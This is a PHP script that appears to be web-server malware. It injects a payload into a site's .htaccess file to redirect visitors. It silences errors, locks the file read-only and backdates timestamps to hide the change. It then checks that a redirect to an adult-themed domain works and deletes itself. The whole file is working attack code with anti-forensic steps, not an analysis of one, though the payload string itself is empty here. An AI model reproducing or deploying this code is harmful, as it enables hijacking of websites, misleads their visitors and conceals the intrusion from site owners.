<?php
@ini_set('error_log',NULL);
@ini_set('display_errors', 0);
@ini_set('log_errors',0);
@error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('magic_quotes_runtime', 0);
@date_default_timezone_set('UTC');

if(isset($_SERVER['HTTPS'])) $scheme = $_SERVER['HTTPS'];
else $scheme = '';
if($scheme && $scheme != '' && $scheme != 'off') $host = 'https://'.$_SERVER['HTTP_HOST'];
else $host = 'http://'.$_SERVER['HTTP_HOST'];

$payload = "";
$test_url = $host.'/lilly/123';
$test_location = 'wildhottiegirls.com/profile.php';
$filepath = $_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR.'.htaccess';

if(file_exists($filepath))
{
	if(!is_readable($filepath) || !is_writable($filepath)) chmod($filepath, 0644);
	if(!is_readable($filepath) || !is_writable($filepath)) stop('re_error_access');
	$old_time = filemtime($filepath) - 1;
	$old_htaccess = file_get_contents($filepath);
	$htaccess = $payload.PHP_EOL.$old_htaccess;
}
elseif(is_writable($_SERVER['DOCUMENT_ROOT']))
{
	$old_time = filemtime($_SERVER['DOCUMENT_ROOT']) - 1;
	$htaccess = $payload;
}
else stop('re_error_rigths');

if(file_put_contents($filepath, $htaccess))
{
	try
	{
		chmod($filepath, 444);
		touch($filepath, $old_time);
		touch($_SERVER['DOCUMENT_ROOT'], $old_time);
	}
	catch(Exception $e) {}
	sleep(5);
	if(test()) stop('OK');
	elseif(isset($old_htaccess) && file_exists($filepath) && is_readable($filepath) && is_writable($filepath))
		file_put_contents($filepath, $old_htaccess);
	stop('re_error_test');
}
else stop('re_error_save');

function test()
{
	global $test_url, $test_location;
	if(is_callable("curl_exec"))
	{
		$ch=curl_init();
		curl_setopt($ch, CURLOPT_URL,$test_url);
		curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:38.0) Gecko/20100101 Firefox/38.0');
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_HEADER,true);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
		$content=curl_exec($ch);
		$location = curl_getinfo($ch, CURLINFO_REDIRECT_URL);
		curl_close($ch);
		if(strpos($location, $test_location) !== false) return true;
		else return false;
	}
	elseif(is_callable("fsockopen"))
	{
		if($fp=fsockopen(parse_url($test_url,PHP_URL_HOST),80,$e,$e,15))
		{
			$out ="GET ".parse_url($test_url,PHP_URL_PATH)." HTTP/1.1\r\n";
			$out.="Host: ".parse_url($test_url,PHP_URL_HOST)."\r\n";
			$out.="User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:38.0) Gecko/20100101 Firefox/38.0\r\n";
			$out.="\r\n";
			fputs($fp,$out);
			while(!feof($fp)) 
			{
				$content.=fgets($fp,128);
			}
			fclose($fp);
			if(strpos($content, $test_location) !== false) return true;
			else return false;
		}
		else return false;
	}
	else return false;
}

function stop($msg)
{
	unlink(__file__);
	die('<result>'.$msg.'</result>');
}
?>